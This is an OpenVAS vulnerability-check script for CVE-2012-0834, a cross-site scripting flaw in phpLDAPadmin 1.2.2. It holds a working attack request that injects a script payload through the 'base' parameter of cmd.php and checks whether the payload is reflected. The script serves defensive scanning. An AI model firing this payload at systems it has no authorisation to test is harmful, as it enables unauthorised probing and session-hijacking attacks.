###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_phpldapadmin_base_param_xss_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the  context of an affected site.

Impact Level: Application";

tag_affected = "phpLDAPadmin version 1.2.2";

tag_insight = "The flaw is due to improper validation of user-supplied input
to the 'base' parameter in 'cmd.php', which allows attackers to execute
arbitrary HTML and script code in a user's browser session in the context
of an affected site.";

tag_solution = "Upgrade to phpLDAPadmin 1.2.3 or later,
For updates refer to http://phpldapadmin.sourceforge.net/wiki/index.php/Main_Page";

tag_summary = "This host is running phpLDAPadmin and is prone to cross site
scripting vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802602");
  script_version("$Revision: 9352 $");
  script_cve_id("CVE-2012-0834");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-02-02 16:16:16 +0530 (Thu, 02 Feb 2012)");
  script_name("phpLDAPadmin 'base' Parameter Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47852/");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Feb/5");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/109329/phpldapadmin-xss.txt");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("phpldapadmin_detect.nasl");
  script_mandatory_keys("phpldapadmin/installed");
  script_require_ports("Services/www", 80);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Variable Initialization
dir = "";
url = "";
req = "";
res = "";
port = 0;
cookie = NULL;

port = get_http_port(default:80);

if(! dir = get_dir_from_kb(port:port,app:"phpldapadmin")){
  exit(0);
}

## Send and Receive the response
req = http_get(item:string(dir, "/index.php"),  port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Session ID
cookie = eregmatch(pattern:"Set-Cookie: ([^;]*);", string:res);
if(isnull(cookie[1])) {
  exit(0);
}
cookie = cookie[1];

## Construct attack request
url = "/cmd.php?cmd=query_engine&server_id=1&query=none&format=list&show"+
      "results=na&base=<script>alert(document.cookie)</script>&scope=sub"+
      "&filter=objectClass%3D*&display_attrs=cn%2C+sn%2C+uid%2C+postalAd"+
      "dress%2C+telephoneNumber&orderby=&size_limit=50&search=Search";
req = http_get(item:dir + url, port:port);
req = string(chomp(req), '\r\nCookie: ', cookie, '\r\n\r\n');

## Send request and receive the response
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(res =~ "HTTP/1\.. 200" && "><script>alert(document.cookie)</script>" >< res){
  security_message(port);
}
